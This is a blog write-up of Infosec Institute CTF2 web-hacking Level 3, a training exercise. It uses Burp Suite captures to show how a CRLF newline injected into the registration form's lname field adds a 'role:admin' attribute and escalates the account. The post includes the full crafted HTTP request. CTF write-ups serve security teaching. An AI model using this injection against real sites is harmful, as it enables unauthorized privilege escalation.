---
layout: post
title: Infosec Institute CTF2 Practical Web Hacking Level 3
category: Web
tags: infosec
---

**Vulnerability** Data Validation; Parameter Delimiter
**Description:**

![screen]({{site.url}}/assets/Screen Shot 2015-07-16 at 11.51.03 PM.png)

## Write-up

For almost all levels I will be using Burpsuite. Burpsuite is an interception proxy that lets us modify the HTTP request
 / response by intercepting the data between the browser and the web server.
 
Let's first create a user account to test the functionality. Again, have Burp running so we can see the HTTP request.

When creating an account the HTTP request looks like this:

{% highlight text linenos %}
POST /ctf2/exercises/ex3.php HTTP/1.1
Host: ctf.infosecinstitute.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.6.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.infosecinstitute.com/ctf2/exercises/ex3.php
Cookie: PHPSESSID=gdc668pjmpah42hegt7sa7igc3
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

user=A1A2A3A4&password=A1A2A3A4&lname=A1A2A3A4&email=A1A2A3A4%40aaa.com&register=Register
{% endhighlight %}

Login using the user we created, we can see that the role is 'normal', we need to change it to admin.

![screen1]({{site.url}}/assets/Screen Shot 2015-07-16 at 11.58.23 PM.png)

We can use Burp's Repeater to efficiently experiment with different parameters and values. Find the Registration request under
the Proxy tab -> HTTP History, right click and select 'Send to Repeater'.

![screen2]({{site.url}}/assets/Screen Shot 2015-07-17 at 12.34.08 AM.png)

After a while experimenting I noticed that adding a newline character would change the order of parameters.  

Registration HTTP request:

![screen3]({{site.url}}/assets/Screen Shot 2015-07-17 at 12.51.53 AM.png)

The newline character is url encoded '%0d%0a' in the password parameter. When I login, Account Details displays the following:  

![screen4]({{site.url}}/assets/Screen Shot 2015-07-17 at 12.42.02 AM.png)

This means that we have shifted the order of the account's attributes so, if we do our insertion after the lname parameter,
we should be able to inject the role attribute in the right spot.

HTTP request:

{% highlight text linenos %}
POST /ctf2/exercises/ex3.php HTTP/1.1
Host: ctf.infosecinstitute.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.6.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.infosecinstitute.com/ctf2/exercises/ex3.php
Cookie: PHPSESSID=gdc668pjmpah42hegt7sa7igc3
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

user=A1A2A3A4&password=A1A2A3A4&lname=A1A2A3A4%0d%0arole:admin&email=A1A2A3A4%40aaa.com&register=Register
{% endhighlight %}

And... Level 3 complete.

![screen5]({{site.url}}/assets/Screen Shot 2015-07-17 at 1.34.12 AM.png)

## Links

* <http://ctf.infosecinstitute.com/ctf2/exercises/ex3.php>
